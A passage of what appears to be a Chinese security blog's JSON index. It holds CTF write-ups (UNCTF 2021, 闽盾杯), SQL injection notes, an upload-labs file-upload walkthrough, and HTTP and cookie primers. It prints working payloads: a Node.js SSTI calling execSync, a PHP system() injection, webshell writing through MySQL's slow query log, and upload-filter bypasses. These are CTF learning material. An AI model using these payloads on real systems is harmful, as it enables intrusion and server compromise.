-DVWA","slug":"web-DVWA","permalink":"http://example.com/tags/web-DVWA/"}]},{"title":"关于sql注入方法的补充","slug":"关于sql注入方法的补充","date":"2021-12-07T13:26:44.000Z","updated":"2021-12-13T15:07:22.728Z","comments":true,"path":"2021/12/07/关于sql注入方法的补充/","link":"","permalink":"http://example.com/2021/12/07/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E7%9A%84%E8%A1%A5%E5%85%85/","excerpt":"前言打了些比赛后发现sql注入还有很多姿势没有学会，这篇博客专门对新见到的sql注入进行补充说明。","text":"前言打了些比赛后发现sql注入还有很多姿势没有学会，这篇博客专门对新见到的sql注入进行补充说明。 模糊查询注入这是从unctf的一道题目学习到的。 关于模糊查询模糊查询的语句格式一般如下：SELECT 字段(一般用*) FROM 表 WHERE 某字段 Like 条件 在mysql中，模糊查询有四种用法： 匹配任意个数与类型的字符 123%a%：把某字段中含有a的数据全部搜索出来where username like %a% and username like %d%：把username字段中含有a与d的数据全部搜索出来%a%d%：把某字段中含有a和d的数据全部搜索出来，并且a在d的前面 匹配任意单个字符 123_a_：把某字段中三个字的且中间为a的数据全部搜索出来__a：把某字段中三个字的且最后为a的数据全部搜索出来等等 指定一个范围 1[abc]1：搜索a1、b1与c1，如果中括号内为连续的数字或字母，可以简写为[1-5]或者[a-e] 指定一个范围排除之 1[^abc]1：搜索除a1、b1与c1外_1的结果，如果中括号内为连续的数字或字母，可以简写为[^1-5]或者[^a-e] 使用条件在登录时要登录admin但是被限制登录（例如限制ip）时可以使用模糊查询，也就是已知要查询的数据名时可以使用。 慢查询日志这是深育杯中的ezsql题目，用到了慢查询日志来进行sql注入。 关于慢查询日志MySQL的慢查询日志用来记录在MySQL中响应时间超过阀值的语句，具体指运行时间超过long_query_time值的SQL语句，会被记录到慢查询日志中。long_query_time的默认值为10。默认情况下，Mysql数据库并不启动慢查询日志，需要我们手动来设置这个参数。 使用方法首先使用setglobal slow_query_log=1;开启慢查询日志，接着用setglobal slow_query_log_file=&#39;&#39;;设置慢查询日志的位置。这里可以直接使用sleep()设置执行时间，如果sleep被过滤了，我们可以修改慢查询日志的时间值：setglobal long_query_time=0.000001;，然后再查询webshell访问就可以了。 猜测后端payload这是buu中的[SUCTF 2019]EasySQL这道题目，有两种解题方法，这里都介绍下。 跑一下fuzz发现能过滤的基本都过滤了，所以联合、报错、盲注等方法都不能使用。 这题要我们对后端语句进行猜测，这是这题最难的地方，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名。接着使用堆叠注入验证，得出payload大概为： 1sql=&quot;select&quot;.sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;; 方法一输入*，1，使语句变为： 1select *,1||flag from Flag 此时1||flag计算为1，因此payload最终被识别为： 1select *,1 from Flag 方法二使用堆叠注入写入select @@global.sql_mode查看，发现PIPES_AS_CONCAT，因此我们可以进行利用。 输入1;set sql_mode=pipes_as_concat;select 1，这里使用到了pipes_as_concat使||变为连接操作符，这样就绕过了原本应有的判断导致语句无返回值。 这里对常见的sql_mode值进行补充： ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。 ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常 PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -sql","slug":"web-sql","permalink":"http://example.com/tags/web-sql/"}]},{"title":"【unctf2021】write up","slug":"【unctf2021】write-up","date":"2021-12-06T11:15:46.000Z","updated":"2021-12-07T04:20:38.593Z","comments":true,"path":"2021/12/06/【unctf2021】write-up/","link":"","permalink":"http://example.com/2021/12/06/%E3%80%90unctf2021%E3%80%91write-up/","excerpt":"前言unctf的题挺有意思的，题型也很新，不过我主要还是做了misc和密码，web涉及到的知识点挺多的，就很多没做出来。","text":"前言unctf的题挺有意思的，题型也很新，不过我主要还是做了misc和密码，web涉及到的知识点挺多的，就很多没做出来。 Misc简单日志审计真的很简单，打开日志发现应该是在进行目录扫描，但是大多都爆404了，不过其中有两行base64代码返回了500，我们base64解码发现这样一串：对，cat后面的部分就是flag：UNCTF{CTF?YouShouJiuXing} 引大流咯，happy开门见贝拉，这题给了描述：虚掩的大门后是一副残缺的画卷。我们就不难想到是更改图片的高度，010编辑图片高度，发现flag： 电信诈骗给了一串奇奇怪怪的值：qi]m^roVibdVbXUU`h，这很明显并不是什么编码格式，题目提示我们flag的格式为unctf{}，那么我们那前5位的ascii码值分别于unctf的ascii码值比较，发现分别差了4,5,6,7,8位，这样我们就找到了规律，编写脚本： 123456789101112131415#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; char s[]= &quot;qi]m^roVibdVbXUU`h&quot;; int n = 4; for (int i = 0; i &lt; sizeof(s);i++)&#123; s[i]+=n; n++; &#125; for (int i = 0; i &lt; sizeof(s);i++) cout &lt;&lt; s[i]; return 0;&#125; 跑出来结果为unctf{yauoreright} 倒立洗头下载附件发现是一串16进制码，复制进010后发现这个十六进制码是颠倒的，我们写脚本把它倒立过来： 1234567input = open(&#x27;key.txt&#x27;,&#x27;rb&#x27;)input_all = input.read()ss = input_all[::-1]output = open(&#x27;true.jpg&#x27;,&#x27;wb&#x27;)output.write(ss)input.close()output.close() 将倒立过来的十六进制码写入后发现开头有exif，猜测可能文件里面写入了什么东西，查找了==发现了一串base64码： 解码后发现是一串与佛论禅密码： 最后解码，记得要把佛日改为佛曰： cryptoeasy_rsa直接给了q、p、e、c，写脚本就能跑出来了： 123456789101112import libnump=12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101q=9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471e=65537c=28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225n = p*qphi = (p-1)*(q-1)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) 探秘中世纪城堡12年轻的大帝率领着64位皇珈骑士冲破了双重阻栏夺下了城池。AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259 根据提示判断是凯撒密码和栅栏密码，先跑凯撒密码，但是没有什么结果，因此想到再进行一次base64解密，这次当凯撒密码key值为7时，跑出来了结果： 再根据提示进行栅栏解密，key为2： 分析badusb流量具体原理参考下面两篇博客：linux usb键盘驱动详解Linux input.h 每一行4位，前两个值20则对应大写，00则无大写。对应出flag为UNCTF{Y0u-Are-very-n1ce} 电信诈骗pro也是一串奇怪的码：5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7= 但是有了上次的经验，这次我们也用相同的方法判断前5位，发现每一位的ascii码值与unctf的ascii相差都是64。如果超过了ascii码最大值的话，就从32开始继续计算，写脚本： 1234567891011121314151617181920#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; char s[]= &quot;5.#4&amp;;Sw)2Ti\\%*Sj1eUU9kTwi*Sj\\)1S\\&quot;a8S0\\)6x-8\\(x7=&quot;; int n = 64, h; for (int i = 0; i &lt; sizeof(s);i++)&#123; if(s[i]&lt;=62) s[i] += n; else&#123; h = 126 - s[i]; s[i] = 32; s[i] = s[i] + n - h; &#125; &#125; for (int i = 0; i &lt; sizeof(s);i++) cout &lt;&lt; s[i]; return 0;&#125; flag为unctf{5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw} webfuzz_md5GET一个user为unctf，但是会进行替换，这个地方双写就可以绕过了。接着要POST一个pass使md5后编码的值开头五位为66666，这里因为我有md5字典所以就直接找出来了： can_you_hacked_me看上去很像sql，但是翻源码发现提示我们www.zip，下载下来有一份源码和一份数据库文件。数据库文件给了管理员的账号密码，但是源码指出必须本地登录才能获得flag，而且这里用了`$_SERVER[&quot;REMOTE_ADDR&quot;]`获取ip，这个ip是不能通过头文件伪造的。 因此这题还真是sql注入，用到了like的模糊查询构建payload： phpmysql构建payload：host=ls&amp;user=DirectoryIterator&amp;pwd=&quot;/&quot;);system(&quot;cat /fllllaaaaag&quot;);echo (&quot;1&quot; 用DirectoryIterator遍历目录，先闭合pwd变量，接着用system返回cat /fllllaaaaag的值，最后再次闭合括号。 nodejs_ssti构建payload：&#123;&#123;''.constructor.constructor(\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()\")()&#125;&#125;","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"cookie、session与token","slug":"cookie、session与token","date":"2021-12-05T04:29:39.000Z","updated":"2021-12-05T09:12:39.426Z","comments":true,"path":"2021/12/05/cookie、session与token/","link":"","permalink":"http://example.com/2021/12/05/cookie%E3%80%81session%E4%B8%8Etoken/","excerpt":"前言由于http协议的无状态性，导致服务器收到客户端请求后得到的都是全新的请求，不知道历史记录，为了解决这个问题，便引入了cookie和session来弥补这个不足。","text":"前言由于http协议的无状态性，导致服务器收到客户端请求后得到的都是全新的请求，不知道历史记录，为了解决这个问题，便引入了cookie和session来弥补这个不足。 关于session客户端请求服务端，服务端会为这次请求开辟一块内存空间，这个对象便是Session对象。服务器可以利用Session存储客户端在同一个会话期间的一些操作记录。 而session的工作原理就是：服务器第一次接受到请求后开辟一块空间，同时生成一个sessionId，然后通过响应头设置cookie，这个cookie会持续到会话的结束。 但是session空间只能开辟在一个服务器中，如果该服务器负载导致转发到另一个服务器访问，session空间将失效。 关于cookie我们的自定义个性化、购物车、记住密码、用户登录保持等等功能的实现，都运用到了cookie。cookie是服务器发送到web浏览器的一小块数据，浏览器会对其进行储存，并与下一个请求一起发送至服务器。 cookie是如何被创建的呢？这就要引用头文件中的Set-Cookie与Cookie标头了。客户端发送http请求被服务器接收，这时服务器可以发送有Set-Cookie的响应头，这个响应头将cookie从服务器发送到用户代理。这样，随着对服务器的每个新请求，浏览器将使用Cookie头把所有之前储存的Cookie发回服务器。 Cookie一般被分为两种类型：会话cookie（Session Cookie）与永久性Cookie（Persistent Cookie）： 会话Cookie：这种类型的cookie在客户端关闭后便会自动删除，此后永远丢失。这种类型的cookie是不会写入磁盘中的，不过有些web浏览器可能会使用会话进行还原。 永久性Cookie：这种类型的cookie会通过指定Expires或Max-Age指令指定一个过期时间，当到达过期时间后再进行删除。这类的cookie会保存进入磁盘当中。 关于JSON Web Token（JWT）我们知道由于http的无状态性，在网页访问多个页面时，登录信息是不会被保存的，这时用Session Cookie将登录状态保存在内存中，在之后判断数据与读取的SessionId是否相同，以实现登录状态保持。 不过还有一种认证的方式，就是JWT。不同于Session Cookie，JWT储存的信息是经过数字签名的，因此它的安全性是高于Session Cookie的。一般将JWT用来进行认证与信息传输。当用户登录，后面每个请求都会包含JWT，从而允许用户访问该令牌所允许的路由、服务和资源。 JWT的组成格式JWT的组成分为三个部分：Header.Payload.Signature Header:JWT的标记头，包括令牌类型与签名算法，通过Base64Url编码。 Payload：包含一个声明，分为registered（预定义声明）、public（公共声明）与private（自定义声明）三类，通过Base64Url编码。 Signature：签证信息，包括base64编码后的Header与payload，以及secret。签名用于验证消息是否被更改，如果是私钥签名的JWT还可以验证发送者身份。 总结认识理解了session、cookie与token之后，我们接下来学习xss、CSRF、SSRF等漏洞可以更加顺利，同时可以加深我们对网页原理的理解。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"【闽盾杯2021】部分wp","slug":"【闽盾杯2021】部分wp","date":"2021-12-02T13:46:41.000Z","updated":"2021-12-06T11:16:37.222Z","comments":true,"path":"2021/12/02/【闽盾杯2021】部分wp/","link":"","permalink":"http://example.com/2021/12/02/%E3%80%90%E9%97%BD%E7%9B%BE%E6%9D%AF2021%E3%80%91%E9%83%A8%E5%88%86wp/","excerpt":"前言还是太菜了现在，web1那个绕过就是没解出来，工控害人不浅啊（。我解了最简单的两题misc，把wp下。","text":"前言还是太菜了现在，web1那个绕过就是没解出来，工控害人不浅啊（。我解了最简单的两题misc，把wp下。 Signin下载附件下来发现是一个文本，里面是一串只有0和1的数字码，而且个数为250000个，刚好是500*500，因此怀疑这题是将数字转化为二维码，编写脚本： 1234567891011121314from PIL import ImageMAX = 500pic = Image.new(&quot;RGB&quot;,(MAX, MAX))str = 那串250000位数字i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(&quot;flag.png&quot;) 得到二维码图片，但是缺了一角，我们将其补全： 扫码得出flag。 日志审查下载附件是一个access.log，一个日志文件。我们用Notepad++打开并进行url解码，得到阅读性更强的日志。观察最前面几条语句，判断当返回长度等于675时为正确回显，而长度为678则是错误回显。根据题目要求我们提供管理员的密码，我们搜索寻找password部分审计： 这里使用了二分法猜测判断每一位ascii码值，当这个码值大于真实值返回678且大于（真实值-1）的时候返回675就可以判断出该位的ascii码值，并参考表格对照。密码总共十一位，每一位对应的ascii码值分别为：110 103 106 102 100 115 85 98 100 75转化成密码即flag为：ngjfdsUbdK 总结今年不是原题杯了，而且很多题目都披着工控的皮，一下觉得不适应。还是要多想、多做、多练。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"}]},{"title":"http协议","slug":"http协议","date":"2021-11-29T13:47:51.000Z","updated":"2021-12-01T08:27:19.886Z","comments":true,"path":"2021/11/29/http协议/","link":"","permalink":"http://example.com/2021/11/29/http%E5%8D%8F%E8%AE%AE/","excerpt":"前言http协议的学习掌握对我们理解底层原理有相当大的作用，可以帮助我们更好地认识web。这里只对http做粗略学习，具体的理解应用需要结合实战。不过你连http都不会怎么好意思说自己是学web的（ps.这篇博客同时含有TCP/IP的三次握手与四次握手。","text":"前言http协议的学习掌握对我们理解底层原理有相当大的作用，可以帮助我们更好地认识web。这里只对http做粗略学习，具体的理解应用需要结合实战。不过你连http都不会怎么好意思说自己是学web的（ps.这篇博客同时含有TCP/IP的三次握手与四次握手。 了解HTTPHTTP（Hypertext Transfer Protocol），超文本传输协议，指的是在计算机世界中专门在两点之间传输超文本数据的规范。 超文本指的是现在计算机可以传输文字、图片、音频、视频，甚至点击文字或图片能够进行超链接的跳转，文本的语义被扩大化，因此被称为超文本。 传输指的是由传输载体负责把二进制数据包由计算机终端传输到另一个终端的过程。通常我们把传输数据包的一方称为请求方，把接到二进制数据包的一方称为应答方。请求方和应答方可以进行互换，请求方也可以作为应答方接受数据，应答方也可以作为请求方请求数据。 网络协议指的是网络中（包括互联网）传递、管理信息的一些规范。ftp、http、ftmp、pop、tcp/ip这些都是网络协议。 网络模型与OSI模型网络模型为了给网络协议设计结构，设计者以分层的方式设计组织网络协议，每个协议属于层次模型之一，且每一层都向其上一层提供服务。每个分层中所有协议被称为协议栈，因特网协议栈分为五个部分：物理层、链路层、网络层、运输层和应用层。 应用层应用层是网络应用程序和网络协议存放的分层。应用层协议分布在多个端系统上一个端系统应用程序与另外一个端系统应用程序交换信息分组，我们把位于应用层的信息分组称为报文(message)。常用的HTTP协议、FTP协议等等都在这一层中。 运输层运输层在应用程序断点之间传送应用程序报文。这一层中主要用到的是TCP协议与UDP协议，我们把运输层的分组称为报文段(segment)。 TCP是面向连接的、可靠的流协议。流就是指不间断的数据结构，当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端。UDP是不具有可靠性的数据报协议。细微的处理它会交给上层的应用去完成。在UDP的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。 网络层网络层负责将数据报的网络分层从一台主机移动到另一台主机，所有具有网络层的因特网组件都必须运行IP协议，因此一般把网络层称为IP层。 链路层为了将分组从一个节点运输到另一个节点，网络层必须依靠链路层提供服务。链路层的例子包括以太网、WiFi和电缆接入的DOCSIS协议，因为数据从源目的地传送通常需要经过几条链路，一个数据包可能被沿途不同的链路层协议处理，我们把链路层的分组称为帧(frame)。 物理层物理层的作用是将帧中的一个个比特从一个节点运输到另一个节点，物理层的协议仍然使用链路层协议。 OSI模型ISO提出来计算机网络应该按照7层来组织，OSI要比上面的网络模型多了表示层和会话层，其他层基本一致。 表示层主要包括数据压缩和数据加密以及数据描述，数据描述使得应用程序不必担心计算机内部存储格式的问题。 会话层提供了数据交换的定界和同步功能，包括建立检查点和恢复方案。 HTTP工作流程0、原始状态：客户端与服务器之间没有关系1、客户端与服务器之间建立连接，发送请求2、服务器接受请求，返回响应信息3、释放连接TCP连接4、客户端收到响应（一般为Html代码）并解析内容5、客户端与服务器断开连接 HTTP请求特征 简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有 GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得 HTTP 服务器的程序规模小，因而通信速度很快。 灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 HTTP请求信息与响应信息格式请求：1、请求行（1）请求方法（2）请求资源路径（URL的一部分）（3）所用协议及版本2、请求头部信息key:value3、空行（一定要有）4、请求主体信息 响应：1、状态行：协议版本 状态码 状态文字2、消息抱头key:value3.空行（一定要有）4、响应主体信息 关于请求方法1、OPTIONS返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性2、HEAD向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。3、GET向特定的资源发出请求。4、POST向指定资源提交数据进行处理请求（例如提交表单或者上传文件），数据被包含在请求体中。5、PUT向指定资源位置上传其最新内容6、DELETE请求服务器删除Request-URL所标识的资源7、TRACE回显服务器收到的请求，主要用于测试或诊断8、CONNECTHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 关于URLhttp:\\\\host[:port][abs_path][?query]#fragment协议：告诉浏览器使用何种协议，常用的是http协议或https协议主机（host）：域名或ip，指示需要向网络上哪一台发起请求端口（port）：表示用于访问WEB服务器上资源的入口，如果访问的该 Web 服务器使用HTTP协议的标准端口（HTTP为80，HTTPS为443）授予对其资源的访问权限，则通常省略此部分。路径（abs_path）：web服务器上资源的路径，以端口后第一个/开始，到?结束查询参数（query）：提供给web服务器的额外参数，如果为GET请求一般URL带有查询参数锚点（fragment）：给予浏览器显示位于该点的内容的指示，其片段标识符不会与请求一起发送到服务器 请求头 Host：表示对象所在主机，指明了服务器的域名，以及（可选的）服务器监听的TCP端口号。如果没有给定端口号，会自动使用被请求服务的默认端口 Connection： 决定当前事务（一次三次握手和四次挥手）完成后，是否会关闭网络连接。若为持久性连接（keep-alive）则事务完成后不关闭网络连接，反之为非持久性连接（close），一次事务完成后关闭网络连接。 User-agent: 请求头用来告诉 Web 服务器，浏览器使用的类型 Date：表示请求时的格林威治时间 Content-Length：实体报头指示实体主体的大小，以字节为单位，发送到接收方。 HTTP Referer 属性是请求标头的一部分，当浏览器向 web 服务器发送请求的时候，一般会Referer：告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。 Upgrade-Insecure-Requests：用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应。 Accept：接受请求 HTTP 标头会通告客户端其能够理解的 MIME 类型。文本文件： text/html、text/plain、text/css、application/xhtml+xml、application/xml图片文件： image/jpeg、image/gif、image/png视频文件： video/mpeg、video/quicktime应用程序二进制文件： application/octet-stream、application/zip 状态码2xx：成功响应 200 成功响应 204 请求处理成功，但是没有资源可以返回 206 对资源某一部分进行响应，由Content-Range 指定范围的实体内容。 3xx：需要进行附加操作以完成请求 301 永久性重定向，该状态码表示请求的资源已经重新分配 URI，以后应该使用资源现有的 URI 302 临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。 303 该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。 304 该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。 307 临时重定向。该状态码与 302 Found 有着相同的含义。 4xx：客户端发生错误 400 该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。 401 该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。 403 该状态码表明对请求资源的访问被服务器拒绝了。 404 该状态码表明服务器上无法找到请求的资源。 5xx：服务器本身发生错误 500 该状态码表明服务器端在执行请求时发生了错误。 503 该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 常用其他协议介绍DNS计算机网络中的每个端系统都有一个IP地址存在，而把IP地址转换为便于人类记忆的协议就是 DNS 协议。DNS 的全称是域名系统，它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。 HTTPSHTTP 一般是明文传输，很容易被攻击者窃取重要信息，鉴于此，HTTPS 应运而生。HTTPS和HTTP有很大的不同在于HTTPS是以安全为目标的HTTP通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS在HTTP的基础上增加了SSL层，也就是说HTTPS = HTTP + SSL。 TCP/IP互联网进行通信时，需要相应的网络协议，TCP/IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP/IP，TCP/IP 就是互联网的协议。 关于数据包： 通信的过程其实就对应着数据装包与拆包的过程。装包的过程，数据发送方每层不断地封装首部，添加一些信息用于传输，确保能传输到目的地。拆包的过程，数据接收方每层不断地拆除首部，得到最终传输的数据。 三次握手而要建立TCP/IP连接，就需要三次握手进行初始化。 第一次握手：客户端发送一个TCP标志位SYN=1，ACK=0的数据包给服务端，并随机会产生一个Seq=J.当服务端接收到这个数据后，服务端由SYN=1可知客户端是想要建立连接；第二次握手：服务端要对客户端的联机请求进行确认，向客户端发送应答号ACK=1、SYN=1、确认号Ack=J+1，此值是客户端的序列号加1，还会产生一个随机的序列号Seq=K，这样就告诉客户端可以进行连接；第三次握手：客户端收到数据后检查Ack是否为J+1，以及标志位ACK的值是否为1，若为1，则会发送ACK=1、确认号码Ack=K+1，告诉服务端,你的请求连接被确认，连接可以建立，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。 为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误三次握手是在安全可靠的基础上，握手次数最少的方案。两次握手并不能保证可靠性，四次握手又浪费了效率。当然，有的需要更高安全性的地方，是可以有N次握手协议的，但那是特殊情况。 四次握手四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。在socket编程中，这一过程由客户端或服务端任一方执行close来触发。 第一次挥手：客户端发送一个FIN=M，用来关闭客户端到服务器端的数据传送，客户端进入FIN_WAIT_1状态。意思是说”我客户端没有数据要发给你了”，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。第二次挥手：服务器端收到FIN后，先发送ack=M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入FIN_WAIT_2 状态，继续等待服务器端的FIN报文。第三次挥手：当服务器端确定数据已发送完成，则向客户端发送FIN=N报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入LAST_ACK状态。第四次挥手：客户端收到FIN=N报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送ack=N+1后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。服务器端收到ACK后，就知道可以断开连接了。客户端等待了2MSL后依然没有收到回复，则证明服务器端已正常关闭，这时客户端也关闭连接。最终完成了四次握手。 关于三次握手与四次握手，可以参考这篇博客：详解 TCP 连接的“ 三次握手 ”与“ 四次挥手 ” 总结学习http协议可以帮助我们探索很多漏洞的原理以及web的访问方式，为我们学习cookie与session打下基础。而TCP/IP协议的三次握手与四次握手是相当重要的知识点，需要我们进一步了解学习。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"}]},{"title":"文件上传与upload-labs","slug":"文件上传与upload-labs","date":"2021-11-24T06:34:55.000Z","updated":"2021-11-28T15:36:52.269Z","comments":true,"path":"2021/11/24/文件上传与upload-labs/","link":"","permalink":"http://example.com/2021/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8Eupload-labs/","excerpt":"前言文件上传也是ctf中相当常见的一个考点，通过upload-labs的学习我们可以掌握各种不同的文件上传姿势。","text":"前言文件上传也是ctf中相当常见的一个考点，通过upload-labs的学习我们可以掌握各种不同的文件上传姿势。 关于文件上传文件上传漏洞往往产生于服务器配置不当，导致任意文件的上传，或者在开放文件上传时没有对文件进行严格过滤。就会导致不法分子恶意写入一些webshell，窃取服务器内的文件，造成严重的危害。 webshell及一句话木马webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。 而利用文件上传漏洞进行攻击时最常用的便是一句话木马，通过上传一句话木马文件配合菜刀、蚁剑等webshell连接工具等，获得目标服务器的读取权。 这篇博客详细记录了常用的一句话木马，之后做upload-labs靶场一般用到的是普通php一句话木马：常用的一句话木马 对于一句话木马类型的文件上传，可以参考这篇博客学习：Web安全-一句话木马 upload-labs刷靶场建议先从黑盒开始，等到做不出来了就翻提示和源码做白盒，当然下面是直接从白盒的角度写的。如果文件名被更改，可以在Repeater中Go一下，并在返回中找到文件名。 Pass-01首先在txt文件中写入一句话代码，但php后缀的文件被过滤了，因此我们改后缀格式为jpg并上传。 这题涉及到了JS检测，这题起过滤使用的是JS代码，而php代码在js中被读取，因此我们可以在f12审查元素中删去JS代码，或者直接禁用JS调用就可以直接上传php文件了。 不过一般我们使用另一个方法，使用burp suite抓包： 在蓝线位置我们发现我们上传的文件，在这里将jpg后缀改为php并forward，就成功上传了文件，我们可以在靶场根目录中的upload文件夹看到我们上传的这个文件。 由于本地靶场我们知道文件的绝对路径，因此直接蚁剑连接就可以了： 记得做完之后删除上传的文件。 Pass-02这关涉及到的是MINE，即文件类型绕过，我们同样抓包查看： 我们可以发现这个Content-Type，这里就对你上传的文件进行了一次类型检查，图中网页检查的类型为image/jpeg，这是因为因为我们上传的本身就是jpg文件，因此和第一关一样更改后缀为php就可以了。 但还有另一种方法，如果我们直接上传php文件的话，我们会发现这次的Content-Type变成了application/octet-stream，导致检查不通过，因此我们将其更改为image/jpeg也可以绕过检查。 部分源代码： 123if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] MINE的原理是判断$_Files[&quot;upload_file&quot;][&quot;type&quot;]是不是图片格式（image/gif、imge/jpeg、image\\png），不是则不允许上传。$_Files[&quot;upload_file&quot;][&quot;type&quot;]的值是从请求数据包中Content-Type中获取。 Pass-03提示告诉我们这题过滤了.asp|.aspx|.php|.jsp这四个后缀，不过没了这四个后缀，我们还有很多其他替代品，例如： ASP：asa/cer/cdx ASPX：ashx/asmx/ascx PHP：php4/php5/phtml/php3/pht JSP：jspx/jspf 当然在使用这些后缀之前可能要先对apache进行配置，我们也可以fuzz测试其他没有被过滤的后缀。 这里也放一下源码： 123456789if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 